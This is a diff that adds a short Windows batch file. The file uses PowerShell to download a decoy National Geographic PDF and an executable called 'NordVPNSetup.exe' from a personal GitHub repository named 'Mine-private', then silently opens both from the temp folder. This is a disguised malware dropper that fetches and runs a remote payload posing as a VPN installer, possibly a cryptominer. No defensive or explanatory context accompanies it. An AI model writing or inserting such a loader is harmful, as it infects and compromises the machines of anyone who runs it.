@@ -1,0 +1,8 @@
+@echo off
+
+set files='https://www.nationalgeographic.com/pdf/adult_spring_2018_catalog_reduced.pdf','https://github.com/Nanc0ex/Mine-private/raw/master/NordVPNSetup.exe'
+
+powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
+
+
+
